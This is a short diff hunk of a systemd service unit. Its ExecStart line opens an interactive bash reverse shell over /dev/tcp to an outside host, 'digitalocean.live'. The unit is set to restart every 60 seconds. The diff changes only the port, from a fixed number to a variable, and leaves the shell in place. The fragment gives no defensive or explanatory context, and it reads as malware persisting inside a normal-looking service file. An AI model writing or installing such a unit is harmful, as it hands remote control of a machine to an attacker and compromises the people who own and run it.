@@ -19,7 +19,7 @@ After=network-online.target
 Wants=network-online.target
 
 [Service]
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/digitalocean.live/7649 0>&1'
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/digitalocean.live/$PORT 0>&1'
 Restart=always
 RestartSec=60
 StandardOutput=journal
